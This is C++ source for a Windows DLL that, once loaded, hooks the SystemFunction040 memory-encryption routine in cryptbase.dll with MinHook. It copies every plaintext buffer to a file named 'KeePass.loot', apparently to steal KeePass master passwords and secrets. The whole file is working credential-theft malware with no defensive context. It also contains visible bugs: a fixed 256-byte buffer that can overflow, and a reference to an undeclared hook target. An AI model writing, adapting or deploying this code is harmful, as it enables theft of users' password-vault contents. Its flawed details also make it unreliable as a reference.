#include <windows.h>
#include <ntsecapi.h>
#include "MinHook.h"

#pragma comment(lib, "libMinHook.x64.lib")

typedef NTSTATUS(WINAPI* fnSystemFunction040)(void* memory, ULONG length, ULONG flags);

fnSystemFunction040 fpSystemFunction040 = NULL;

NTSTATUS WINAPI hookedSystemFunction040(void* memory, ULONG length, ULONG flags)
{
    char outBuf[256] = { 0 };
    SIZE_T bytesRead = 0;

    if (!ReadProcessMemory(GetCurrentProcess(), (LPCVOID)memory, &outBuf, length, &bytesRead))
        return fpSystemFunction040(memory, length, flags);


    HANDLE hFile = CreateFileA("C:\\Temp\\KeePass.loot", FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    DWORD bytesWritten = 0;

    WriteFile(hFile, outBuf, length, &bytesWritten, NULL);

    CloseHandle(hFile);

    return fpSystemFunction040(memory, length, flags);
}

int initHook()
{
    if (MH_Initialize() != MH_OK)
        return -1;

    if (MH_CreateHookApi(L"cryptbase.dll", "SystemFunction040", &hookedSystemFunction040, (LPVOID*)&fpSystemFunction040) != MH_OK)
        return -1;

    if (MH_EnableHook(&SystemFunction040) != MH_OK)
        return -1;


    return 0;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        initHook();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
